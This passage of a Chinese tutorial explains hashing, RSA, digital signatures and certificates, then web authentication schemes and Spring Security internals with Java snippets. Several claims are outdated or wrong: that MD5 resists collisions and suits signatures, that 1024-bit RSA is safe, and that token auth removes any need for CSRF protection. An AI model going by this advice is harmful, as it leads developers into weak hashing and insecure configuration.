5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。\n\nMD5算法具有以下特点：\n1. 压缩性：任意长度的数据，算出的MD5值长度都是固定的。\n2. 容易计算：从原数据计算出MD5值很容易。\n3. 抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。\n4. 强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。\n\nMD5的作用是让大容量信息在用数字签名软件签署私人密钥前被\"压缩\"成一种保密的格式（就是把一个任意长度的字节串变换成一定长的16进制数字串）。\n\n大家都知道，地球上任何人都有自己独一无二的指纹，这常常成为司法机关鉴别罪犯身份最值得信赖的方法；与之类似，MD5就可以为任何文件（不管其大小、格式、数量）产生一个同样独一无二的MD5“数字指纹”，如果任何人对文件做了任何改动，其MD5也就是对应的“数字指纹”都会发生变化。\n\n### SHA\n安全散列算法（英语：Secure Hash Algorithm，缩写为SHA）是一个密码散列函数家族，是FIPS所认证的安全散列算法。能计算出一个数字消息所对应到的，长度固定的字符串（又称消息摘要）的算法。且若输入的消息不同，它们对应到不同字符串的机率很高。\n\nSHA家族的五个算法，分别是SHA-1、SHA-224、SHA-256、SHA-384，和SHA-512\n\n### Base64算法\nBase64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法\n\n### RSA\n1976年以前，所有的加密方法都是同一种模式：\n```\n（1）甲方选择某一种加密规则，对信息进行加密；\n（2）乙方使用同一种规则，对信息进行解密。\n```\n由于加密和解密使用同样规则（简称\"密钥\"），这被称为**对称加密算法**（Symmetric-key algorithm）。\n这种加密模式有一个最大弱点：甲方必须把加密规则告诉乙方，否则无法解密。保存和传递密钥，就成了最头疼的问题。\n\n1976年，两位美国计算机学家Whitfield Diffie 和 Martin Hellman，提出了一种崭新构思，可以在不直接传递密钥的情况下，完成解密。这被称为\"Diffie-Hellman密钥交换算法\"。这个算法启发了其他科学家。人们认识到，加密和解密可以使用不同的规则，只要这两种规则之间存在某种对应关系即可，这样就避免了直接传递密钥。\n\n这种新的加密模式被称为**非对称加密算法**。\n```\n（1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。\n（2）甲方获取乙方的公钥，然后用它对信息加密。\n（3）乙方得到加密后的信息，用私钥解密。\n```\n**如果公钥加密的信息只有私钥解得开，那么只要私钥不泄漏，通信就是安全的。**\n公钥和私钥通常有可以互相加解密的特性：\n- 将原始信息用公钥加密后，**只能用私钥解密，不能用公钥解密；**\n- 将原始信息用私钥加密后，通常可以使用公钥解密。\n\n1977年，三位数学家Rivest、Shamir 和 Adleman 设计了一种算法，可以实现非对称加密。这种算法用他们三个人的名字命名，叫做**RSA算法**。从那时直到现在，RSA算法一直是最广为使用的\"非对称加密算法\"。毫不夸张地说，只要有计算机网络的地方，就有RSA算法。\n这种算法非常可靠，密钥越长，它就越难破解。根据已经披露的文献，目前被破解的最长RSA密钥是768个二进制位。也就是说，长度超过768位的密钥，还无法破解（至少没人公开宣布）。因此可以认为，1024位的RSA密钥基本安全，2048位的密钥极其安全。\n\n#### 举例子\n为了讲这个故事，小北请来了密码学中常用的学术情侣，Alice 和 Bob，以及窃听者代表 Eve。\n我们从 Alice、Bob 约会的故事展开，来讲讲其中暗藏着哪些危机，又是如何一步步化解的。\n九月，一个夜黑风高的晚上，Bob 想约 Alice 出来玩，于是给 Alice 发了一封邮件：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161121.png)\n\n但我们都知道网络是不可信的，并且由于消息在网络中是明文传输的，所以黑客可以轻易的截获、篡改甚至冒充 Bob。\n来，我们看看黑客 Eve 是怎么干的：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161133.png)\n\n瞧，Eve 轻易的拿到了邮件内容 （窃听），并且修改了邮件内容 （篡改），甚至说他可以随时冒充 Bob 给 Alice 发送邮件 （伪装）。\n如果上图中 Eve 伪造的内容被 Alice 接收到了，那么后果可想而知。\n现实世界中，我们每天都在通过网络进行聊天、转账、浏览不存在网站。\n如果都是这样明文传输数据，显然毫无安全感。\n\n既然我们不能明文传输，那么 Bob 和 Alice 提前商量好密钥，使用对称加密对邮件内容加密不就好了~\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161145.png)\n\n现在 Bob 发送的邮件都使用和 Alice 提前商量好的密钥加密后再传输。\n由于没有密钥，Eve 就算截获到数据也无法获取邮件的内容，也没法篡改和冒充 Bob。\n因为篡改后的数据必须使用密钥再次加密 Alice 才能正确解密。\n那么只要 Bob 和 Alice 能够保证 密钥不泄露，整个通信就是安全的。\n如果密钥泄露，被中间人截获，那么就等同于明文通信。\n所以我们不能把安全性寄托在人上面。\n并且这里也存在一个问题，如果两个人不能线下见面， 如何在网上安全的交换密钥呢？\n这似乎是无解的，因为交换密钥的时候我们必须明文通信，不然对方根本看不懂。但是明文交换即意味着可能泄露。\n但是别忘了我们的密码学工具箱里还有一个好东西— 「非对称加密」。\nBob 和 Alice 各自生成一对公私钥，因为公钥本来就是公开的，即可以被任何人获取，所以可以通过网络明文交换公钥。\n然后使用公钥加密邮件内容后发送给对方，接收者使用自己的私钥即可解密。完美~\n\n来看看，在非对称加密体系下，Bob 如何给 Alice 发消息的。\n首先 Alice 需要先生成一对公私钥，私钥只能 Alice 自己知道，公钥是可以让任何人都知道的，因此可将公钥直接发送给 Bob，就算被截获也无所谓。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161156.png)\n\nBob 使用 Alice 的公钥加密邮件内容，加密后的内容只能由 Alice 的私钥解密，所以就算 Eve 截获也是徒劳。\n反之，如果 Alice 想给 Bob 回信，就需要用 Bob 的公钥加密后发送。\n这就解决了密钥交换问题，也保证了邮件内容不会泄露。也就是说现在可以防窃听。\n\n## 数字签名\n不知道你注意到没有，这里也存在另外一个问题：Eve 也可以使用 Alice 的公钥冒充 Bob 给 Alice 发邮件啊，因为 Alice 的公钥本来就是公开的，任何人都可以获得。 \n由于 Eve 也可以获得 Alice 公钥，所以没法防止 Eve 伪造和篡改，并且对于 Alice 而言，她无法分辨出邮件到底是 Eve 发的还是 Bob。\n所以这个问题的本质就是 「Alice 如何确认邮件来自于 Bob」。\n那么在生活中，我们如何做这件事呢？\n那就是让 Bob 在纸上签名并且按手印，因为指纹和字迹是 Bob 独有的，其它人很难伪造。\n所以我们需要在计算机中引入类似的机制：\n即只有 Bob 自己能够产生的独一无二的标志，并且其它人能够验证这个标志确实是属于 Bob的。\n这就是我们今天要讲的主题—「数字签名」。\n还记得什么是 Bob 独有的吗？\n对，就是 Bob 自己的私钥，Bob 用自己的私钥对邮件内容计算一个「签名」，将「签名」和邮件内容一起发送出去，接受者 Alice 可以使用 Bob 的公钥验证这个签名是否正确，这就叫「验签」。\n如果不是 Bob 的私钥计算的签名，那么 Alice 用 Bob 公钥验签将会出错。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161208.png)\n\n可以看到， Eve 试图使用自己的私钥计算签名然后发送给 Alice， 但是 Alice 使用 Bob的公钥进行验签时将会出错！\n那么 Eve 可能篡改内容并冒充 Bob 的签名吗？不可能！因为内容发生改变时，对应的签名也需要重新计算，而签名的生成依赖于私钥，只要 Bob 的私钥不泄露，签名就不会被冒充。\n啊啥？你说万一私钥泄露了怎么办？那就当我没说......\n所以使用数字签名，我们能够鉴别消息的发送者，也就是说黑客无法伪装发送者进行发送数据，也无法篡改。\n\n>注意：\n可以看出我们这里数据是明文传输的，存在窃听风险。但是我们为了阐述数字签名机制是如何运转的，故意将保证信息机密性的机制省略了。\n如果想要保证数据的机密性，我们常见的做法是，通信双方通过非对称加密安全交换对称加密的密钥，后续通信过程的数据都使用对称加密保证数据机密性。\n并且「签名」的作用本身也不是用来保证数据的机密性，而是用于验证数据来源的防止数据被篡改的，也就是确认发送者的身份。\n\n一般而言，我们不会直接对数据本身直接计算数字签名，为什么呢？\n因为数字签名属于非对称加密，非对称加密依赖于复杂的数学运算，包括大数乘法、大数模等等，耗时比较久。\n如果数据量大的时候计算数字签名将会比较耗时，所以一般做法是先将原数据进行 Hash 运算，得到的 Hash 值就叫做「摘要」。\n「摘要」就像人的指纹一样，可以代表一个人，只要内容发生了改变，计算出来的摘要也应该变化。\n「摘要」最好是不可逆转的，一般使用开头提到的 MD5 作为 Hash 函数，MD5 输出的结果固定位 128 位。\n\n>为什么「摘要」最好是不可逆转的？\n因为既然 Alice 可以用 Bob 公钥解开签名，那么理论上其它人，比如 Eve 也可以使用 Bob 公钥解开签名拿到数据。\n所以我们最好对数据的「摘要」进行签名，这样，Eve 就算解开签名，拿到的也是「摘要」，如果摘要是不可逆转的，也就是无法从摘要反推出原文，也就达到了保密的作用。\n\n发送者使用私钥对「摘要」计算数字签名。那么接收者如何验证呢？\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161220.png)\n\n接受者 Alice 收到后，取下数字签名，同时用 Bob 的公钥解密，得到「摘要1」，证明确实是 Bob 发的。\n( 画外音：如果使用 Bob 的公钥验证签名出错，那么签名一定不是 Bob 的私钥生成的）\n再对邮件内容使用相同的散列函数计算「摘要2」，与上面得到的「摘要1」进行对比，两者一致就说明信息未被篡改。\n这样两步分证明发送者身份和保证数据未被篡改。\n\nBob 和 Alice 现在可以依赖于对称加密进行保密通信，也可以依赖于数字签名验证消息是否是对方发送的。\n但是这一切的根基是建立在 Alice 持有的公钥确实是 Bob的，反之亦然。\n什么意思呢？\n试想，Eve 如果将自己的公钥冒充 Bob 发送给 Alice，然后 Alice 保存了下来，那以后凡是 Bob 发送的消息，反而会验证签名失败，被当做冒充者。\n那你可能会问，为什么 Eve 可以将自己的公钥发送给 Alice，而 Alice 毫不知情呢？\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161231.png)\n\n\n看！我们又回到了最初的起点，只不过这次被篡改的是公钥，之前是消息本身。\n因为 Bob 的公钥是直接通过网络发送给 Alice的，所以 Eve 才可以在这一步做手脚，进行篡改，将自己的公钥冒充 Bob 发送给 Alice，也就是发送公钥这一步没有做到：\n- 防篡改\n- 防冒充\n防篡改怎么和防冒充怎么实现的呢？\n我们前面讲了，就是靠数字签名！ 但是数字签名需要接受者持有发送者公钥，才能进行验签。\n而我们现在处理的是分发公钥这一步，所以.......死锁了。这像是先有鸡还是先有蛋的问题\n现在的问题就是「Bob 无法证明它自己是 Bob」。\n这个是不是似曾相识，以前去办事的时候经常被要求出具「我妈是我妈」这类证明。但是我们自己说“我妈就是我妈”，人家根本不会信呀，需要一个可信第三方出具证明，比如派出所。\n那么「Alice 如何才能确认 Bob 发送给自己的公钥确实是 Bob 的，而没有被篡改？」\n在只有 Alice 和 Bob 两人的情况下是没法验证的。\n所以，我们这里也需要一个第三方帮 Bob证明 「Bob 的公钥就是 Bob 的公钥」，有点绕口令那感觉了~\n\n## 数字证书\n为了解决这个问题，就引入了「数字证书」，什么叫数字证书呢？\n\n>百度百科：\n数字证书是指在互联网通讯中标志通讯各方身份信息的一个数字认证，人们可以在网上用它来识别对方的身份。\n因此数字证书又称为数字标识。数字证书对网络用户在交流中的信息和数据等以加密或解密的形式保证了信息和数据的完整性和安全性。\n\n看了这个描述，是不是感觉还是云里雾里，还是我用大白话来说吧~\n只要你理解了前面的数字签名，就能理解这里的数字证书，因为我把数字证书叫做「公钥的数字签名」。\n为什么呢？我们引入数字证书的目的是为了保证公钥不被篡改，即使被篡改了也能识别出来。\n而防篡改的方法就是数字签名，但是这个签名不能我们自己做，原因说过了，因为我们的公钥还没分发出去，别人无法验证。\n所以只能找可信的第三方来帮我们签名，即证书颁布机构（CA），CA 会将：证书的颁布机构、有效期、公钥、持有者(subject)等信息用 CA 的私钥进行签名。\n并且将签名结果和这些信息放在一起，这就叫做「数字证书」。\n这样，Bob 就可以去 CA 申请一个证书，然后将自己的证书发给 Alice，那么 Alice 如何验证这个证书确实是 Bob的呢？\n当然是使用 CA 的公钥进行验签。\n\n>注意：\nCA 的公钥也是需要使用证书来分发的，所以 Alice 的电脑必须安装 CA 的证书，证书里包含了 CA 的公钥。\n\n收到 Bob 发过来的数字证书后，Alice 使用 CA 的公钥进行验证，验证通过即证明这确实是 Bob 证书，也就可以使用证书中包含的 Bob 的公钥，按照之前讨论的流程进行通信。\n那么 Eve 是否可以在中途篡改 Bob 的证书呢？\n答案是不行，因为证书的信息使用 CA 的私钥进行签名，只要 Eve 修改了任何一个 Bit 都会导致最后签名验证不通过。\n那 Eve 可不可以修改证书信息后自己重新计算一次证书的数字签名呢？\n也不行，因为证书的数字签名计算依赖于 CA 的私钥，Eve 是拿不到 CA 的私钥的。\n如果拿到了，说明什么？整个世界都是不可信的。\n\n### 数字证书长啥样\n这是我电脑中的自带的证书：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161247.png)\n\n可以看到，包含了证书持有人的公钥和证书的签名。\n另外，证书颁发机构是有层级关系的，下级 CA 的证书是需要由上级 CA 签名的。\n换句话说一定存在根证书颁发机构，那么他们的证书是由谁签名的呢？\n答案是自签，自己给自己认证。\n这是我电脑中的一个自签的根证书颁发机构：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161300.png)\n\n为什么根证书可以自签，谁来保证安全？\n你把钱存在银行，你会担心吗？我们基于对国家的信任，才信任银行，这就是信任链的基础！我们思考问题应该是分层的，如果不认可一个统一的基础，一直套娃下去，那么问题就无解。\n那还有个问题，如何保证根证书的可靠性？\n这是操作系统和浏览器预装的，由微软、苹果等操作系统厂商来选择根证书。\n\n### 证书不可信？\n那么什么情况下浏览器会提示 “证书不可信” 呢？\n根据我们上面的分析，下面是可能的原因：\n- 证书不是权威 CA 颁发; 有些企业为了贪图便宜使用盗版的证书，没有经过 CA 认证。也就是无法使用浏览器内置 CA 公钥进行验证。\n- 证书过期; 上面说了，证书里有一项就是有效期，一般就是一年或者两年的时间。如果证书过期，那么浏览器就会提示“证书不可信”\n- 证书部署错误; 可能是服务器证书部署出错，比如证书与域名不匹配，因为证书里有一项是持有人信息的。\n\n好了，饶了一大圈，Bob 终于可以安全的向 Alice 发出前往红树林的邀请了~\n\n## 总结\n1. 加密与数字签名的区别?\n加密是为了防止信息被泄露，而数字签名是为了防止信息被篡改\n\n2. 非对称加密中公私钥都可以加密，那么什么时候用公钥加密，什么时候用私钥“加密” ？\n加密场景，那么肯定希望只有我才能解密，别人只能加密。即**公钥加密，私钥解密**\n签名场景，既然是签名，就希望只能我才能签名，别人只能验证。而能唯一确定是我的就是私钥。 即**私钥签名，公钥验签**\n\n3. 什么是数字签名，数字签名的作用是什么？\n数字签名就是使用私钥对数据摘要进行签名，并附带和数据一起发送。\n可以起到防篡改、防伪装、防否认的作用。\n\n4. 为什么要对数据的摘要进行签名，而不是直接计算原始数据的数字签名？\n数据可能比较大，签名是使用非对称加密算法，比较耗时\n防止第三方使用公钥解开签名后，拿到原始数据\n\n5. 什么是数字证书，数字证书存在解决了什么问题？\n数字证书就是由 CA 机构使用自己私钥，对证书申请者的公钥进行签名认证。\n数字证书解决了如何安全分发公钥的问题，也奠定了信任链的基础。\n\n\n\n\n# 常用的认证机制\n## HTTP Basic Auth \nHTTP Basic Auth简单点说明就是每次请求API时都提供用户的username和password，简言之，Basic Auth是配合RESTful API使用的最简单的认证方式，只需提供用户名密码即可，但由于有把用户名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的RESTful APl时，尽量避免采用HTTP Basic Auth。\n### Cookie Auth Cookie\n认证机制就是为一次请求认证在服务端创建一个Session对象，同时在客户端的浏览器端创建了一个Cookie对象；通过客户端带上来Cookie对象来与服务器端的session对象匹配来实现状态管理的。默认的，当我们关闭浏览器的时候，cookie会被删除。但可以通过修改cookie 的expire time便cookie在一定时间内有效。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161311.png)\n\n## OAuth\nOAuth（开放授权，Open Authorization）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一web服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。如网站通过微信、微博登录等，主要用于第三方登录。\nOAuth允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。每一个令牌授权一个特定的第三方系统（例如，视频编辑网站）在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。这样，OAuth让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容。\n\n这种基于OAuth的认证机制适用于个人消费者类的互联网产品，如社交类APP等应用，但是不太适合拥有自有认证权限管理的企业应用。\n\n缺点：过重。\n\n## Token auth\n使用基于Token的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：\n1. 客户端便用用户名跟密码请求登录\n2. 服务端收到请求，去验证用户名与密码\n3. 验证成功后，服务端会签发一个Token，再把这个Token发送给客户端\n4. 客户端收到Token以后可以把它存储起来，比如放在Cookie里\n5. 客户端每次向服务端请求资源的时候需要带着服务端签发的Token\n6. 服务端收到请求，然后去验证客户端请求里面带着的Token，如果验证成功，就向客户端返回请求的数据\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161321.png)\n\n`Token auth`比`http basic auth`更安全，比`Cookie Auth Cookes`更节约服务器资源，比OAuth更加轻量\n\n**具体，Token Auth的优点（Token机制相对于Cookie机制又有什么好处呢？）：**\n- 支持跨域访问：Cookie是不允许垮域访问的，这一点对Token机制是不存在的，前提是传输的用户认证信息通过HTTP头传输.\n- 无状态（也称：服务端可扩展行）：Token机制在服务端不需要存储session信息，因为Token自身包含了所有登录用户的信息，只需要在客户端的cookie或本地介质存储状态信息。\n- 更适用CDN：可以通过内容分发网络请求你服务端的所有资料（如：javascript，HTML，图片等），而你的服务端只要提供APl即可.\n- 去耦：不需要绑定到一个特定的身份验证方案。Token可以在任何地方生成，只要在你的API被调用的时候，你可以进行Token生成调用即可\n- 更适用于移动应用：当你的客户端是一个原生平台（iOS，Android等）时，Cookie是不被支持的（你需要通过Cookie容器进行处理），这时采用Token认证机制就会简单得多。\n- CSRF：因为不再依赖于Cookie，所以你就不需要考虑对CSRF（跨站请求伪造）的防范。\n- 性能：一次网络往返时间（通过数据库查询session信息）总比做一次HIMACSHA256计算的Token验证和解析要费时得多.\n- 不需要为登录页面做特殊处理：如果你使用Protractor做功能测试的时候，不再需要为登录页面做特殊处理。\n- 基于标准化：你的API可以采用标准化的JSON Web Token（JWT）.这个标准已经存在多个后端库（.NET，Ruby, Java，Python，PHP）和多家公司的支持（如：Firebase，Google，Microsoft）.\n\n# SpringSecurity简介\nspring Security是针对Spring项目的安全框架，也是SpringBoot底层安全模块默认的技术选型，它可以实现强大的web安全控制，对于安全控制，我们仅需引入spring-boot-starter-security模块，进行少量的配置，即可以实现强大的安全管理\n\nSpring Security的两个主要目标是\"认证(Authentication)\"和\"授权(Authorization)\"(访问控制)\n- 认证 （你是谁）: 是建立一个它声明的主体的过程(一个主体一般指用户，设备或一些可以在你的应用程序中执行动作的其他系统)，通俗点说就是系统认为用户是否能登陆\n- 授权 （你能干什么）：指确定一个主体是否允许在你的应用程序执行一个动作的过程。通俗点讲就是系统判断用户是否有权限去做某些事情\n\n**权限管理中的相关概念**\n- 主体：使用系统的用户或设备或从其他系统远程登录的用户等等。简单说就是谁使用系统谁就是主体\n- 认证：统确认一个主体的身份，允许主体进入系统。简单说就是“主体”证明自己是谁。\n- 授权：将操作系统的“权力”“授予”“主体”，这样主体就具备了操作系统中特定功能的能力。\n\nSpringSecurity 本质是一个过滤器链\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161333.png)\n例如如下：\n- FilterSecurityInterceptor：过滤器的最后一环， 这里会判定该请求是否能进行访问rest服务，判断的依据是 BrowserSecurityConfig中的配置，如果被拒绝了就会抛出不同的异常（根据具体的原因）\n- ExceptionTranslationFilter：是个异常过滤器，用来处理在认证授权过程中抛出的异常\n- UsernamePasswordAuthenticationFilter ：对/login 的 POST 请求做拦截，校验表单中用户名，密码。\n\n## springSecurity表单登录认证过程\n当我们访问一个受保护的资源时，如果之前没有进行登录认证，会触发认证异常，此时security会有该异常对应的默认处理类(LoginUrlAuthenticationEntryPoint.java)来处理这个异常, 这个异常处理类的处理逻辑是跳转到你指定的登陆页面。我们可以通过如下代码来指定我们的登陆页面地址：\n```java\nhttp.formLogin()\n\t\t.loginPage(\"/login.html\");\n```\n我们也可以使用通过下面代码来使用我们自定义的异常处理类来处理认证异常\n```java\nhttp.exceptionHandling()\n\t\t\t.authenticationEntryPoint(自定义类);\n```\n\n如果我们在登陆页面提交表单登陆认证，会经历如下过程：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161343.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161354.png)\n\n表单登陆认证过程：\n- 用户提交用户名、密码被SecurityFilterChain中的`usernamePasswordAuthenticationFilter`过滤器获取到，封装为请求Authentication, 通常情况下是UsernamePasswordAuthenticationToken这个实现类\n- 然后过滤器将Authentication提交至认证管理器(AuthenticationManager)进行认证\n- 认证成功后，`AuthenticationManager`身份管理器返回一个被填充满了信息的(包括上面提到的权限信息，身份信息，细节信息，但密码通常会被移除)`Authentication`实例\n- `SecurityContextHolder`安全上下文容器将第三步填充了信息的`Authentication`, 通过SecurityContextHolder.getContext().setAuthentication(...)方法，设置到其中。\n\n通过上述，可以看出AuthenticationManager接口(认证管理器)是认证相关的核心接口，也是发起认证的出发点，它的实现类为ProviderManager。而Spring Security支持多种认证方式，因此ProviderManager维护`List<AuthenticationProvider>`列表，存放多种认证方式，最终实际的认证工作是由`AuthenticationProvider`完成的。我们知道web表达对应的`AuthenticationProvider`实现类为`DaoAuthenticationProvider`, 它的内部又维护着一个`UserDetailsService`类，通过调用该类的loadUserByUsername()来返回一个UserDetails对象。最终`AuthenticationProvider`将`UserDetials`填充至`Authentication`\n\n## AuthenticationProvider\n通过前面的Spring Security认证流程我们得知，认证管理器(AuthenticationManager)委托AuthenticationProvider完成认证工作\n`AuthenticationProvider`是一个接口，定义如下：\n```java\npublic interface AuthenticationProvider{\n  Authentication authenticate(Authentication authentication) throws AuthenticationException;\n  boolean supports(Class<?> var1);\n}\n```\nauthenticate()方法定义了认证的实现过程，它的参数是一个Authentication, 里面包含了登陆用户所提交的用户、密码等。而返回值也是一个Authentication, 这个Authentication则是在认证成功后，将用户的权限及其他信息重新组装后生成\n\nSpring Security中维护着一个`List<AuthenticationProvider>`列表，存放多种认证方式，不同的认证方式使用不同的AuthenticationProvider。如使用用户名登陆时，使用AuthenticatinProvider1, 短信登陆时使用AuthenticationProvider2。\n\n每个AuthenticationProvider需要实现supports()方法来表明自己支持的认证方式，如我们使用表单方式认证，在提交请求时Spring Security会生成UsernamePasswordAuthenticationToken, 它是一个Authentication, 里面封装着用户提交的用户名、密码信息，其由`DaoAuthenticationProvider`来处理\n\n## Authentication接口\n```java\npublic interface Authentication extends Principal, Serializable{\n  Collection<? extends GrantedAuthority> getAuthorities();\n  Object getCredentials();\n  Object getDetails();\n  Object getPrincipal();\n  Object isAuthenticated();\n  void setAuthentiated(boolean var1) throws IllegalArgumentException;\n}\n```\n- getAuthorities(): 权限信息列表，默认是GrantedAuthority接口的一些实现类，通常是代表权限信息的一系列字符串\n- getCredentials(): 凭证信息，用户输入的密码字符串，在认证过后通常会被移除，用于保障安全。\n- getDetails(): 细节信息，web应用中的实现接口通常为WebAuthenticationDetails, 他记录了访问者的ip地址和session的值\n- getPrincipal(): 身份信息，大部分情况下返回的是UserDetails接口的实现类，UserDetails代表用户的详细信息，那从Authentication中取出来的UserDetails就是当前登陆用户信息\n\n## UserDetailsService接口讲解\nDaoAuthenticationProvider处理了web表单的认证逻辑，认证成功后既得到一个Authentication(UsernamePasswordAuthenticationToken实现)，里面包含了身份信息(Principal)。这个身份信息就是一个Object,大多数情况下它可以被强转为UserDetails对象\n\nDaoAuthenticationProvider中包含了一个UserDetailsService实例，<font color=\"red\">通过调用UserDetailsService类中loadUserByUsername()方法来根据前端传来的用户名username来提取到用户信息UserDetails对象(包含密码)，而后DaoAuthenticationProvider会去对比UserDetailsService提取的用户密码与用户提交的密码是否匹配作为认证成功的关键依据</font>，因此可以通过将自定义的UserDetailsService公开为spring bean来自定义身份验证\n\n`UserDetailsService接口中就只有一个方法`\n```java\npublic interface UserDetailsService{\n  //通过前端传来的username, 来获取对应的UserDetails\n  UserDetails loadUserByUsername(String username) throws usernameNotFoundException;\n}\n```\n很多人把DaoAuthenticationProvider和UserDetailsService的职责搞混淆，\n\n\n当什么也没有配置的时候，账号和密码是由Spring Security定义生成的。而在实际项目中\n账号和密码都是从数据库中查询出来的。 所以我们要通过自定义逻辑控制认证逻辑。\n如果需要自定义逻辑时，只需要实现 UserDetailsService 接口即可。接口源码如下：\n\n**返回值UserDetails接口的详解**\n这个接口是系统默认的用户主体\n该接口中的方法：\n```java\n// 获取登录用户所有权限\nCollection<? extends GrantedAuthority> getAuthorities();\n// 获取密码\nString getPassword();\n// 获取用户名\nString getUsername();\n// 判断账户是否过期\nboolean isAccountNonExpired();\n// 判断账户是否被锁定\nboolean isAccountNonLocked();\n// 判断段凭证{密码}是否过期\nboolean isCredentialsNonExpired();\n// 判断当前用户是否可用\nboolean isEnabled();\n```\n\n**UserDetails的实现类User**\nUser类的两个构造参数：\n```java\npublic User(String username, String password, Collection<? extends GrantedAuthority> authorities) {\n  this(username, password, true, true, true, true, authorities);\n}\n\npublic User(String username, String password, boolean enabled, boolean accountNonExpired, boolean credentialsNonExpired, boolean accountNonLocked, Collection<? extends GrantedAuthority> authorities) {\n  if (username != null && !\"\".equals(username) && password != null) {\n    this.username = username;\n    this.password = password;\n    this.enabled = enabled;\n    this.accountNonExpired = accountNonExpired;\n    this.credentialsNonExpired = credentialsNonExpired;\n    this.accountNonLocked = accountNonLocked;\n    this.authorities = Collections.unmodifiableSet(sortAuthorities(authorities));\n  } else {\n    throw new IllegalArgumentException(\"Cannot pass null or empty values to constructor\");\n  }\n}\n\t```\n注：User类的构造方法中的username参数是UserDetailsService接口中的loadUserByUsername方法中的username参数， 而User类的构造方法中的password等其他参数都是根据username从数据库中查出来的。\n根据从数据库中得到的password与**前端传来的经过密码解析器加密的password相比较**，如果相同，则认证通过，反之不通过\n\n## FilterSecurityInterceptor类的作用\nFileterSecurityInterceptor中有2个重要的步骤：\n1. 从安全对象中获取属性\n```java\nCollection<ConfigAttribute> attributes = this.obtainSecurityMetadataSource().getAttributes(object);\n```\n2. 由AccessDecisionManager进行权限判断\n```java\nthis.accessDecisionManager.decide(authenticated, object, attributes);\n```\n接下来我们逐一分析这2步\n### ConfigAtttribute\n从表面意思上我们可以猜测到，它是和安全对象相关的配置的属性。其实它就是我们在HttpSecurity中给特定的url设置的安全属性：permitAll，denyAll，anonymous，authenticated，fullyAuthenticated，rememberMe。从debug中我们可以发现`this.obtainSecurityMetadataSource()`默认获得是ExpressionBasedFilterInvocationSecurityMetadataSource类，该类是FilterInvocationSecurityMetadataSource的实现类，该类的作用就是通过调用`getAttributes(object)`方法来获取此requestURL对应的ConfigAttributes。我们通过下面的方法来自定义这个`this.obtainSecurityMetadataSource()`所获取的类：\n首先自定义该类，该类实现FilterInvocationSecurityMetadataSource接口\n```java\n@Component\npublic class CustomFilter implements FilterInvocationSecurityMetadataSource {\n\t@Autowired\n\tprivate IMenuService menuService;\n\tAntPathMatcher antPathMatcher = new AntPathMatcher();\n\t@Override\n\tpublic Collection<ConfigAttribute> getAttributes(Object object) throws IllegalArgumentException{\n\t\t//获取请求的url\n\t\tString requestUrl = ((FilterInvocation)object).getRequestUrl();\n\t\tList<Menu> menus = menuService.getMenusWithRole();\n\t\tfor(Menu menu : menus){\n\t\t\t//判断请求url与菜单角色是否匹配menus = {ArrayList@11529}  size = 22\n\t\t\tif(antPathMatcher.match(menu.getUrl(), requestUrl)){\n\t\t\t\tString[] str = menu.getRoles().stream().map(Role::getName).toArray(String[]::new);\n\t\t\t\treturn SecurityConfig.createList(str);\n\t\t\t}\n\t\t}\n\t\t//每匹配的url默认登陆即可访问\n\t\treturn SecurityConfig.createList(\"ROLE_LOGIN\");\n\t}\n\t@Override\n\tpublic Collection<ConfigAttribute> getAllConfigAttributes() {return null;}\n\t@Override\n\tpublic boolean supports(Class<?> aClass) {return false;}\n}\n\n```\n然后指定这个类为`this.obtainSecurityMetadataSource()`所获取的类：\n```java\nhttp.csrf()\n\t\t////使用JWT时，不需要csrf\n\t\t.disable()\n\t\t.and()\n\n\t\t//动态权限配置\n\t\t.withObjectPostProcessor(new ObjectPostProcessor<FilterSecurityInterceptor>() {\n\t\t\t@Override\n\t\t\tpublic <O extends FilterSecurityInterceptor> O postProcess(O o) {\n\t\t\t\to.setSecurityMetadataSource(customFilter); //自定义`this.obtainSecurityMetadataSource()`所获取的类：\n\t\t\t\treturn o;\n\t\t\t}\n\t\t})\n\n```\n## AccessDecisionManager接口\nAccessDecisionManager接口中最重要的方法是`decide`,该方法会根据获得到的`Collection<ConfigAttuibute>`来判断该用户是否有权力访问该资源。springsecurity对应着一个该默认的实现类，我们也通过下面的方式来设置成我们自定义的实现类\n编写实现类\n```java\n@Component\npublic class CustomUrlDecisionManager implements AccessDecisionManager {\n\t@Override\n\tpublic void decide(Authentication authentication, Object o, Collection<ConfigAttribute> collection) throws AccessDeniedException, InsufficientAuthenticationException {\n\t\tfor(ConfigAttribute configAttribute : collection)\t{\n\t\t\tString needRole = 